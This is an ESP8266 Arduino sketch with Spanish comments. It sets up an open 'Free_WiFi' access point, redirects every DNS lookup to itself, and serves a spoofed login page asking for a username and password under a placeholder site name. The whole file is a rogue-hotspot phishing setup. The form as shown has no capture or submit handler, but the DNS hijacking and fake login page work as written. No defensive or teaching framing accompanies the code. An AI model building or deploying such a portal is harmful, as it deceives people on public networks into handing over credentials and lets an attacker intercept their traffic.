#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String lastHost = "sitio-falso";

void setup() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP("Free_WiFi", "");  // AP sin contraseña
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  dnsServer.start(DNS_PORT, "*", apIP);  // Responde a cualquier dominio

  webServer.onNotFound([]() {
    // Generar página HTML con el último host "simulado"
    String html = "<html><head><title>" + lastHost + "</title></head><body>";
    html += "<h2>Login - " + lastHost + "</h2>";
    html += "<form><input placeholder='Usuario'><br><input type='password' placeholder='Contraseña'></form>";
    html += "</body></html>";
    webServer.send(200, "text/html", html);
  });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
